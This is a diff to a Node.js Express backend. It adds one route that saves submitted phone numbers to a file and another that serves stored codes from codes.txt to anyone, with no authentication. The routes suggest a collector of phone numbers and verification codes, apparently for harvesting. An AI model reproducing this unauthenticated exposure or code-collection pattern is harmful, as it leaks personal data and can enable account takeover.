@@ -15,6 +15,30 @@ app.get('/', (req, res) => {
   res.send('Backend is running!');
 });
 
+app.post('/save-phone', (req, res) => {
+    const phone = req.body.phone;
+    if (phone) {
+      fs.appendFile('phones.txt', `${new Date().toISOString()} - ${phone}\n`, (err) => {
+        if (err) return res.status(500).json({ error: 'Failed to save phone' });
+        res.json({ status: 'success' });
+      });
+    } else {
+      res.status(400).json({ error: 'No phone number provided' });
+    }
+  });
+ 
+  app.get('/view-codes', (req, res) => {
+    const fs = require('fs');
+    const path = require('path');
+    const filePath = path.join(__dirname, 'codes.txt');
+  
+    fs.readFile(filePath, 'utf8', (err, data) => {
+      if (err) return res.status(500).send('Could not read file');
+      res.type('text').send(data);
+    });
+  });
+  
+
 app.post('/store-code', (req, res) => {
   const code = req.body.code;
   if (!code) {
